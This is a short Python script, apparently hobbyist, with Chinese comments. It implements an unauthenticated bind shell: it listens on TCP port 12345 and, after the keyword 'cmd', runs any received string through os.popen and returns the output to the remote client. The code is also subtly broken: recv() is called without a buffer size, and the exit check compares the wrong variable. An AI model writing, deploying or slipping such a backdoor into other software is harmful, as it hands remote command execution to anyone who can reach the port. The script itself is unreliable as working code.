import os
import socket


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 12345
    s.bind((host, port))
    s.listen(5)

    while True:
        c,addr = s.accept()

        print("连接地址",addr)
        c.send("欢迎大佬".encode("UTF-8"))
        while True:
            try:
                recv_data=c.recv(1024).decode("UTF-8")
                print(recv_data)
                if(recv_data=='cmd'):
                    while True:  #循环接受CMD命令
                        c.send("OK cmd start".encode("UTF-8"))
                        data=c.recv()
                        recv2=data.decode("UTF-8")
                        if recv_data=='exit':
                            c.send("OK cmd stop".encode("UTF-8"))
                            break
                        else:
                            x=os.popen(recv2).read()
                            c.send(x.encode("utf-8")) #命令回显
                else:
                    c.send(recv_data.encode("UTF-8"))
            except:
                print("断开连接")
                break
        c.close()

    s.close()




if __name__ == "__main__":
    main()